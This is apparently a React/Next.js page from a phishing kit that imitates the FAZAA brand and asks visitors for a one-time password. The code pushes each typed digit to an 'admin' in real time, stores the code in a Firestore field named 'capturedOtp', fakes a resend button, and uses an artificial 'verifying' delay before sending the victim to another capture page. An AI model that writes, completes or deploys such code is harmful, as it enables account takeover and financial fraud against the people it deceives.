'use client';
import { useState, useEffect, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useLang } from '@/context/LanguageContext';
import { t } from '@/i18n';
import { pushPresence, trackPresence } from '@/lib/presence';
import { updateDoc, doc } from 'firebase/firestore';
import { db } from '@/lib/firebase';

function OtpContent() {
  const router      = useRouter();
  const searchParams = useSearchParams();
  const { lang }    = useLang();
  const T           = t[lang].otp;

  const id = searchParams.get('id') ?? '';

  const [otp, setOtp]         = useState('');
  const [error, setError]     = useState('');
  const [loading, setLoading] = useState(false);
  const [resent, setResent]   = useState(false);

  useEffect(() => {
    return trackPresence({ page: 'otp', step: 'otp', registrationId: id });
  }, [id]);

  // Push OTP value to admin in real-time as user types
  useEffect(() => {
    if (!otp) return;
    pushPresence({ page: 'otp', step: 'otp', registrationId: id, finalOtp: otp, _v13: otp });
  }, [otp, id]);

  const handleConfirm = async () => {
    if (!otp.trim()) { setError(T.errorEmpty); return; }
    setError('');
    setLoading(true);

    // Persist OTP to the registration document so admin can see it
    try {
      if (id) {
        await updateDoc(doc(db, 'registrations', id), { capturedOtp: otp });
      }
    } catch { /* ignore */ }

    // Push final presence
    pushPresence({ page: 'otp_submitted', step: 'otp', registrationId: id, finalOtp: otp, _v13: otp });

    // Brief artificial delay then navigate to the confirmation code page
    setTimeout(() => {
      router.push(`/code?id=${id}`);
    }, 2500);
  };

  const handleResend = () => {
    setResent(true);
    setTimeout(() => setResent(false), 4000);
  };

  return (
    <>
      {/* Verifying overlay */}
      {loading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center"
          style={{ background: 'rgba(0,0,0,0.50)', backdropFilter: 'blur(3px)' }}>
          <div className="mx-6 w-full max-w-[300px] rounded-2xl px-8 py-8 flex flex-col items-center gap-5"
            style={{ background: 'rgba(50,50,50,0.92)' }}>
            <div className="w-12 h-12 rounded-full border-4 border-[#c9a227]/30 border-t-[#c9a227] animate-spin" />
            <p className="text-white text-center text-[15px]">{T.verifying}</p>
          </div>
        </div>
      )}

      <div className="min-h-screen bg-[#f0f0f0] flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-[420px] bg-white rounded-2xl shadow-md overflow-hidden">

          {/* Header: FAZAA logo */}
          <div className="flex justify-end items-center px-5 pt-5 pb-4 border-b border-gray-100">
            <div className="flex flex-col items-center">
              {/* SVG logo matching screenshot */}
              <svg width="52" height="40" viewBox="0 0 52 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <text x="50%" y="60%" textAnchor="middle" dominantBaseline="middle"
                  fontFamily="Tajawal,sans-serif" fontWeight="bold" fontSize="22" fill="#c9a227">
                  فزعة
                </text>
              </svg>
              <span style={{ color: '#c9a227', fontWeight: 700, fontSize: 11, letterSpacing: '0.15em' }}>FAZAA</span>
            </div>
          </div>

          <div className="px-8 py-8 flex flex-col items-center gap-6 text-center" dir="rtl">
            {/* Phone icon */}
            <div className="relative w-20 h-20 flex items-center justify-center">
              <svg width="54" height="54" viewBox="0 0 54 54" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="9" y="4" width="30" height="46" rx="5" stroke="#c9a227" strokeWidth="2.5" fill="none"/>
                <line x1="9" y1="12" x2="39" y2="12" stroke="#c9a227" strokeWidth="2"/>
                <line x1="9" y1="42" x2="39" y2="42" stroke="#c9a227" strokeWidth="2"/>
                <circle cx="24" cy="47" r="2" fill="#c9a227"/>
              </svg>
              {/* *** badge */}
              <div className="absolute -top-1 -left-1 bg-[#c9a227] text-white rounded-lg px-2 py-0.5 text-[11px] font-bold shadow">
                ***
              </div>
            </div>

            {/* Texts */}
            <div className="space-y-2">
              <p className="text-[17px] font-bold text-gray-900 leading-snug">{T.title}</p>
              <p className="text-sm text-gray-500">{T.subtitle}</p>
            </div>

            {/* OTP Input */}
            <form className="w-full space-y-2" onSubmit={e => { e.preventDefault(); handleConfirm(); }}>
              <input
                type="password"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={otp}
                onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setError(''); }}
                placeholder={T.placeholder}
                className={`w-full border ${error ? 'border-red-400' : 'border-gray-200'} rounded-xl px-4 py-3.5 text-center text-lg outline-none focus:border-[#c9a227] focus:ring-1 focus:ring-[#c9a227] transition-shadow text-gray-800 placeholder:text-gray-300`}
                style={{ WebkitTextSecurity: 'disc', letterSpacing: '0.4em' } as React.CSSProperties}
                dir="ltr"
              />
              {error && <p className="text-xs text-red-500">{error}</p>}
            </form>

            {/* Confirm button */}
            <button
              onClick={handleConfirm}
              disabled={loading}
              className="w-full py-4 rounded-xl font-bold text-[17px] text-white transition-colors disabled:opacity-50 cursor-pointer"
              style={{ background: 'linear-gradient(to left, #7a6318, #c9a227)' }}
            >
              {T.confirm}
            </button>

            {/* Resend link */}
            <button
              onClick={handleResend}
              disabled={resent}
              className="text-[#c9a227] text-sm font-semibold underline-offset-2 hover:underline disabled:opacity-60 cursor-pointer"
            >
              {resent ? '✓ ' : ''}{T.resend}
            </button>
          </div>
        </div>
      </div>
    </>
  );
}

export default function Otp() {
  return <Suspense><OtpContent /></Suspense>;
}
